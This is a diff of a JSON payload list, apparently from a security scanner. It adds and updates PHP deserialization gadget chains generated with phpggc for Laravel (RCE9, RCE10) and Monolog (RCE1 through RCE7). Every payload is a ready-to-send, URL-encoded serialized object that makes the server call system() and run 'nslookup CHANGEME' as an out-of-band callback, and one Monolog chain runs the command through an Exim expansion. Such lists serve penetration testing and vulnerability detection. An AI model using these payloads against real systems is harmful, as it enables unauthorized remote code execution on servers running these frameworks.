@@ -91,39 +91,57 @@
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Monolog 1.4.1 <= 1.6.0 1.17.2 <= 2.2.0+",
+    "name": "Laravel 5.4.0 <= 9.1.8+ (9)",
+    "gen_with": "./phpggc Laravel/RCE9 <function> <parameter>",
+    "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":5:{s:12:\"%00*%00container\"%3BN%3Bs:11:\"%00*%00pipeline\"%3BN%3Bs:8:\"%00*%00pipes\"%3Ba:0:{}s:11:\"%00*%00handlers\"%3Ba:0:{}s:16:\"%00*%00queueResolver\"%3Bs:6:\"system\"%3B}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3Bs:72:\"nslookup CHANGEME\"%3B}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Laravel 5.6.0 <= 9.1.8+ (10)",
+    "gen_with": "./phpggc Laravel/RCE10 <function> <parameter>",
+    "payload": "O:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\"%3Ba:2:{i:0%3BO:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\"%3Bs:14:\"call_user_func\"%3Bs:7:\"request\"%3Bs:6:\"system\"%3Bs:8:\"provider\"%3Bs:72:\"nslookup CHANGEME\"%3B}i:1%3Bs:4:\"user\"%3B}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Monolog 1.4.1 <= 1.6.0 1.17.2 <= 2.7.0+ (1)",
     "gen_with": "./phpggc Monolog/RCE1 <function> <parameter>",
     "payload": "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"%00*%00socket\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3Br:2%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Monolog 1.4.1 <= 2.2.0+",
+    "name": "Monolog 1.4.1 <= 2.7.0+ (2)",
     "gen_with": "./phpggc Monolog/RCE2 <function> <parameter>",
     "payload": "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:6:\"socket\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3Br:2%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Monolog 1.1.0 <= 1.10.0",
+    "name": "Monolog 1.1.0 <= 1.10.0 (3)",
     "gen_with": "./phpggc Monolog/RCE3 <function> <parameter>",
     "payload": "O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BO:35:\"Monolog\\Handler\\NativeMailerHandler\":7:{s:5:\"%00*%00to\"%3BN%3Bs:10:\"%00*%00subject\"%3BN%3Bs:10:\"%00*%00headers\"%3BN%3Bs:8:\"%00*%00level\"%3BN%3Bs:9:\"%00*%00bubble\"%3Bb:0%3Bs:12:\"%00*%00formatter\"%3BN%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}s:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:8:\"%00*%00level\"%3BN%3Bs:9:\"%00*%00bubble\"%3Bb:0%3Bs:12:\"%00*%00formatter\"%3BN%3Bs:13:\"%00*%00processors\"%3BN%3B}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Monolog ? <= 2.4.4+",
+    "name": "Monolog ? <= 2.4.4+ (4)",
     "gen_with": "./phpggc Monolog/RCE4 <command>",
     "payload": "O:30:\"Monolog\\Handler\\RollbarHandler\":2:{s:42:\"%00Monolog\\Handler\\RollbarHandler%00hasRecords\"%3Bb:1%3Bs:16:\"%00*%00rollbarLogger\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":3:{s:13:\"%00*%00bufferSize\"%3Bi:2%3Bs:10:\"%00*%00handler\"%3BO:35:\"Monolog\\Handler\\NativeMailerHandler\":7:{s:8:\"%00*%00level\"%3Bi:1%3Bs:13:\"%00*%00processors\"%3Ba:1:{i:0%3Bs:13:\"array_reverse\"%3B}s:12:\"%00*%00formatter\"%3BO:31:\"Monolog\\Formatter\\LineFormatter\":1:{s:9:\"%00*%00format\"%3Bs:0:\"\"%3B}s:17:\"%00*%00maxColumnWidth\"%3Bi:20%3Bs:13:\"%00*%00parameters\"%3Ba:1:{i:0%3Bs:3:\"-be\"%3B}s:5:\"%00*%00to\"%3Ba:1:{i:0%3Bs:14:\"init@localhost\"%3B}s:10:\"%00*%00headers\"%3Ba:1:{i:0%3Bs:104:\"${run{/bin/bash -c \"nslookup CHANGEME\"}{yes}{no}}\"%3B}}s:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:5:{s:5:\"level\"%3Bi:100%3Bs:7:\"message\"%3Bi:1%3Bs:7:\"context\"%3Ba:0:{}s:5:\"extra\"%3Ba:0:{}s:7:\"channel\"%3Bi:1%3B}}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Monolog 1.25 <= 2.2.0+",
+    "name": "Monolog 1.25 <= 2.7.0+ (5)",
     "gen_with": "./phpggc Monolog/RCE5 <function> <parameter>",
     "payload": "O:37:\"Monolog\\Handler\\FingersCrossedHandler\":3:{s:16:\"%00*%00passthruLevel\"%3Bi:0%3Bs:9:\"%00*%00buffer\"%3Ba:1:{s:4:\"test\"%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:10:\"%00*%00handler\"%3BO:28:\"Monolog\\Handler\\GroupHandler\":1:{s:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
-    "name": "Monolog 1.10.0 <= 2.2.0+",
+    "name": "Monolog 1.10.0 <= 2.7.0+ (6)",
     "gen_with": "./phpggc Monolog/RCE6 <function> <parameter>",
     "payload": "O:37:\"Monolog\\Handler\\FingersCrossedHandler\":3:{s:16:\"%00*%00passthruLevel\"%3Bi:0%3Bs:9:\"%00*%00buffer\"%3Ba:1:{s:4:\"test\"%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3BN%3B}}s:10:\"%00*%00handler\"%3BO:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"%00*%00handler\"%3BN%3Bs:13:\"%00*%00bufferSize\"%3Bi:-1%3Bs:9:\"%00*%00buffer\"%3BN%3Bs:8:\"%00*%00level\"%3BN%3Bs:14:\"%00*%00initialized\"%3Bb:1%3Bs:14:\"%00*%00bufferLimit\"%3Bi:-1%3Bs:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:7:\"current\"%3Bi:1%3Bs:6:\"system\"%3B}}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Monolog 1.10.0 <= 2.7.0+ (7)",
+    "gen_with": "./phpggc Monolog/RCE7 <function> <parameter>",
+    "payload": "O:37:\"Monolog\\Handler\\FingersCrossedHandler\":4:{s:16:\"%00*%00passthruLevel\"%3Bi:0%3Bs:10:\"%00*%00handler\"%3Br:1%3Bs:9:\"%00*%00buffer\"%3Ba:1:{i:0%3Ba:2:{i:0%3Bs:72:\"nslookup CHANGEME\"%3Bs:5:\"level\"%3Bi:0%3B}}s:13:\"%00*%00processors\"%3Ba:2:{i:0%3Bs:3:\"pos\"%3Bi:1%3Bs:6:\"system\"%3B}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
